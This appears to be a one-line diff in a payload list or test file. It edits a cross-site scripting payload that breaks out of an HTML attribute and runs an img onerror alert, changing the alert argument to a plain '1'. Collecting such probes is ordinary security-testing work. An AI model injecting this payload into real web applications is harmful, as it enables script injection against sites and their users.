@@ -1,1 +1,1 @@
-"><img src=x onerror=alert(ROOT/SHADOW/X01DZ)>
+"><img src=x onerror=alert(1)>
